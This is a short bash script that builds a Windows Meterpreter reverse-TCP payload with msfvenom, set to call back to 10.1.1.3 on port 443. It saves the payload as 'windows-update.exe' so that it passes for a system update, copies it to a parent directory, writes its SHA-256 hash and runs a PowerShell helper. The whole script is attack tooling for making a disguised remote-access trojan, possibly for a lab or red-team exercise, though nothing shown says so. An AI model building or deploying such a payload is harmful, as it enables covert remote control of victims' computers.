#/bin/bash
sudo rm windows-update.exe
sudo rm ../../windows-update.exe
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.3 LPORT=443 -f exe > windows-update.exe
sudo cp windows-update.exe ../../windows-update.exe
sudo rm sha256
sudo openssl dgst -sha256 windows-update.exe > sha256
sudo pwsh out-sha256.ps1
